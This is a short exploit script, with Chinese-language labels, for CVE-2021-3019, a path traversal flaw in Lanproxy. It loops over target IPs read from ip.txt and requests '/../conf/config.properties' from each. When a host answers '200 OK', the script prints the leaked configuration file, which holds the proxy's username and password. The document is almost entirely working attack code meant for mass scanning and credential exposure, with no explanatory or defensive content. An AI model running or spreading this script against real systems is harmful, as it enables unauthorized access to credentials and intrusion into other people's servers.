#define dir = /../conf/config.properties
#define bug = 200
#define post = {"username":"","password":""}
#define info = 存在CVE-2021-3019 CVE-2021-3019 Lanproxy 路径遍历漏洞

function main(args){
	dirs = StrSplit(ReadFile("script\CVE漏洞\CVE-2021\CVE-2021-3019 Lanproxy 路径遍历漏洞\ip.txt"),StrRN());
	num = GetArrayNum(dirs);
	i = 0;
	while(i<num){
		try{
			res = HttpGet(dirs[ToInt(i)].dir,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0");
			if(StrFindStr(res[1],"200 OK",0) != "-1"){
				printclolor(dirs[ToInt(i)].",[+] ".info,3);
				print(res[0]);
			}else{
				printclolor(dirs[ToInt(i)].",[-] 不".info,2);
			}
		}catch{
			printclolor(dirs[ToInt(i)].",[-] 请求出错！",5);	
		}
		i = ToInt(i+1);
	}

}
